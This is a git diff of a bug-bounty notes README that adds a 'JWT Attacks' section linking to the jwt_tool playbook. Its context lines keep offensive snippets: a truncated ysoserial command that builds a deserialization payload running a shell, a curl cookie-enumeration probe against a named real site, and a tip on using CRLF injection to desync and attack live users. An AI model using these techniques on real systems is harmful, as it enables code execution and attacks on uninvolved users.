@@ -36,6 +36,7 @@ EasyG started out as a script that I use to automate some information gathering 
   - [CORS](#cors)
   - [Deserialization](#deserialization)
   - [HTTP Host header attacks](#http-host-header-attacks)
+  - [JWT Attacks](#jwt-attacks)
   - [Abusing S3 Bucket Permissions](#abusing-s3-bucket-permissions)
   - [Google Cloud Storage bucket](#google-cloud-storage-bucket)
   - [GraphQL](#graphql)
@@ -861,6 +862,13 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . ec
 - "If someone sends a cookie called '0', automattic.com responds with a list of all 152 cookies supported by the application:
 curl -v -H 'Cookie: 0=1' https://automattic.com/?cb=123 | fgrep Cookie" [[Reference](https://hackerone.com/reports/310105)];
 - CRLF injection [[Reference](https://www.acunetix.com/websitesecurity/crlf-injection/)], "When you find response header injection, you can probably do better than mere XSS or open-redir. Try injecting a short Content-Length header to cause a reverse desync and exploit random live users." [[Reference](https://twitter.com/albinowax/status/1412778191119396864)]
+
+
+
+### JWT Attacks
+
+**Resources**
+- [{JWT}.{Attack}.Playbook](https://github.com/ticarpi/jwt_tool/wiki)
 
 
 
